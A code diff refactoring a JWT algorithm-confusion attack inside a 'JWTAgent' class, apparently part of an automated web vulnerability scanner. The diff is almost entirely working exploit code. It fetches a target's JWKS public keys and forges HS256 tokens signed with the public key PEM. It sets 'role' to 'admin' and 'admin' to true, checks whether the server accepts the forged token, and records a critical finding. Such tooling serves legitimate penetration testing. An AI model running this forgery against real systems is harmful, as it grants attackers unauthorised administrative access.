@@ -568,101 +568,123 @@ class JWTAgent(BaseAgent):
         Algorithm Confusion Attack (RS256 -> HS256).
         Tries to use the server's public key as the symmetric secret.
         """
-        from jwt.algorithms import RSAAlgorithm
-        import aiohttp
-        
         decoded = self._decode_token(token)
         if not decoded or decoded['header'].get('alg') != 'RS256':
             return
 
         self.think("Attempting Key Confusion (RS256 -> HS256)...")
-        
-        # 1. Try to fetch public key (JWKS)
-        # Simplify: assume standard path or extract from elsewhere if possible
-        # For this PoC, we try standard /.well-known/jwks.json relative to target
+
+        # Fetch public keys
+        jwks_url, public_keys = await self._key_confusion_fetch_keys(url)
+        if not public_keys:
+            self.think("Skipping Key Confusion: No public key found.")
+            return
+
+        # Execute attack with all keys and formats
+        await self._key_confusion_execute_attack(public_keys, decoded, url, location, jwks_url)
+
+    async def _key_confusion_fetch_keys(self, url: str) -> Tuple[str, List]:
+        """Fetch public keys from JWKS endpoint."""
+        from jwt.algorithms import RSAAlgorithm
+        import aiohttp
         from urllib.parse import urlparse
+
         parsed = urlparse(url)
         base_url = f"{parsed.scheme}://{parsed.netloc}"
         jwks_url = f"{base_url}/.well-known/jwks.json"
-        
-        public_keys_objs = []
-        
+
+        public_keys = []
+
         try:
             async with aiohttp.ClientSession() as session:
                 async with session.get(jwks_url, timeout=5) as resp:
                     if resp.status == 200:
                         jwks = await resp.json()
                         for key in jwks.get('keys', []):
-                            # Convert JWK to Object
                             try:
                                 public_key = RSAAlgorithm.from_jwk(json.dumps(key))
-                                public_keys_objs.append(public_key)
+                                public_keys.append(public_key)
                             except Exception as e:
                                 logger.debug(f"Failed to parse JWK: {e}")
-                        self.think(f"Found {len(public_keys_objs)} public keys at {jwks_url}")
+                        self.think(f"Found {len(public_keys)} public keys at {jwks_url}")
         except Exception as e:
             logger.debug(f"Failed to fetch JWKS: {e}")
-            
-        if not public_keys_objs:
-            self.think("Skipping Key Confusion: No public key found.")
-            return
 
-        # 2. Execute Attack
-        # Try both SubjectPublicKeyInfo (SPKI) and PKCS1 formats
+        return jwks_url, public_keys
+
+    async def _key_confusion_execute_attack(self, public_keys: List, decoded: Dict, url: str, location: str, jwks_url: str):
+        """Execute key confusion attack with all keys and formats."""
         from cryptography.hazmat.primitives import serialization
+
         formats_to_try = [
             serialization.PublicFormat.SubjectPublicKeyInfo,
             serialization.PublicFormat.PKCS1
         ]
-        
-        for key_obj in public_keys_objs: # We need the object, not just PEM
-            for fmt in formats_to_try:
-                try:
-                    pub_key_pem = key_obj.public_bytes(
-                        encoding=serialization.Encoding.PEM,
-                        format=fmt
-                    )
-                    
-                    # Create forged token signed with HS256 using the public key as secret
-                    new_header = decoded['header'].copy()
-                    new_header['alg'] = 'HS256'
-                    
-                    # Payload: Elevate privileges
-                    new_payload = decoded['payload'].copy()
-                    new_payload['role'] = 'admin'
-                    new_payload['admin'] = True
-                    
-                    # Construct unsigned parts - use STANDARD JWT separators (no spaces)
-                    h_b64 = base64.urlsafe_b64encode(json.dumps(new_header, separators=(',', ':')).encode()).decode().strip('=')
-                    p_json = json.dumps(new_payload, separators=(',', ':')).encode()
-                    p_b64 = base64.urlsafe_b64encode(p_json).decode().strip('=')
-                    
-                    signing_input = f"{h_b64}.{p_b64}".encode()
-                    
-                    # Sign with HMAC-SHA256 using the PEM content as the secret
-                    sig = hmac.new(pub_key_pem, signing_input, hashlib.sha256).digest()
-                    sig_b64 = base64.urlsafe_b64encode(sig).decode().strip('=')
-                    
-                    forged_token = f"{h_b64}.{p_b64}.{sig_b64}"
-                    
-                    self.think(f"Generated Token ({fmt.name}): {forged_token}")
 
-                    if await self._verify_token_works(forged_token, url, location):
-                        self.think(f"SUCCESS: Key Confusion (RS256->HS256) confirmed with format {fmt}!")
-                        self.findings.append({
-                            "type": "JWT Key Confusion",
-                            "url": url,
-                            "parameter": "alg",
-                            "payload": "RS256->HS256 with Public Key",
-                            "severity": "CRITICAL",
-                            "validated": True,
-                            "status": "VALIDATED_CONFIRMED",
-                            "description": f"JWT Algorithm Confusion vulnerability (RS256 to HS256). The server's public RSA key was used as an HMAC secret, allowing token forgery. Public key fetched from {jwks_url}.",
-                            "reproduction": f"# Key Confusion Attack:\n# 1. Fetch public key from {jwks_url}\n# 2. Change alg from RS256 to HS256\n# 3. Sign with public key PEM as HMAC secret\n# Forged token: {forged_token[:60]}..."
-                        })
-                        return
-                except Exception as e:
-                    continue
+        for key_obj in public_keys:
+            for fmt in formats_to_try:
+                if await self._key_confusion_test_format(key_obj, fmt, decoded, url, location, jwks_url):
+                    return  # Success - stop trying
+
+    async def _key_confusion_test_format(self, key_obj, fmt, decoded: Dict, url: str, location: str, jwks_url: str) -> bool:
+        """Test single key format variant."""
+        from cryptography.hazmat.primitives import serialization
+
+        try:
+            pub_key_pem = key_obj.public_bytes(
+                encoding=serialization.Encoding.PEM,
+                format=fmt
+            )
+
+            forged_token = self._key_confusion_forge_token(pub_key_pem, decoded)
+            self.think(f"Generated Token ({fmt.name}): {forged_token}")
+
+            if await self._verify_token_works(forged_token, url, location):
+                self._key_confusion_report_success(fmt, forged_token, url, jwks_url)
+                return True
+
+        except Exception:
+            pass
+
+        return False
+
+    def _key_confusion_forge_token(self, pub_key_pem: bytes, decoded: Dict) -> str:
+        """Forge JWT using public key as HMAC secret."""
+        # Build header
+        new_header = decoded['header'].copy()
+        new_header['alg'] = 'HS256'
+        h_b64 = base64.urlsafe_b64encode(
+            json.dumps(new_header, separators=(',', ':')).encode()
+        ).decode().strip('=')
+
+        # Build payload with elevated privileges
+        new_payload = decoded['payload'].copy()
+        new_payload['role'] = 'admin'
+        new_payload['admin'] = True
+        p_json = json.dumps(new_payload, separators=(',', ':')).encode()
+        p_b64 = base64.urlsafe_b64encode(p_json).decode().strip('=')
+
+        # Sign with public key as HMAC secret
+        signing_input = f"{h_b64}.{p_b64}".encode()
+        sig = hmac.new(pub_key_pem, signing_input, hashlib.sha256).digest()
+        sig_b64 = base64.urlsafe_b64encode(sig).decode().strip('=')
+
+        return f"{h_b64}.{p_b64}.{sig_b64}"
+
+    def _key_confusion_report_success(self, fmt, forged_token: str, url: str, jwks_url: str):
+        """Report successful key confusion attack."""
+        self.think(f"SUCCESS: Key Confusion (RS256->HS256) confirmed with format {fmt}!")
+        self.findings.append({
+            "type": "JWT Key Confusion",
+            "url": url,
+            "parameter": "alg",
+            "payload": "RS256->HS256 with Public Key",
+            "severity": "CRITICAL",
+            "validated": True,
+            "status": "VALIDATED_CONFIRMED",
+            "description": f"JWT Algorithm Confusion vulnerability (RS256 to HS256). The server's public RSA key was used as an HMAC secret, allowing token forgery. Public key fetched from {jwks_url}.",
+            "reproduction": f"# Key Confusion Attack:\n# 1. Fetch public key from {jwks_url}\n# 2. Change alg from RS256 to HS256\n# 3. Sign with public key PEM as HMAC secret\n# Forged token: {forged_token[:60]}..."
+        })
 
     async def _analyze_and_exploit(self, token: str, url: str, location: str):
         """Full analysis and exploitation pipeline for a single token."""
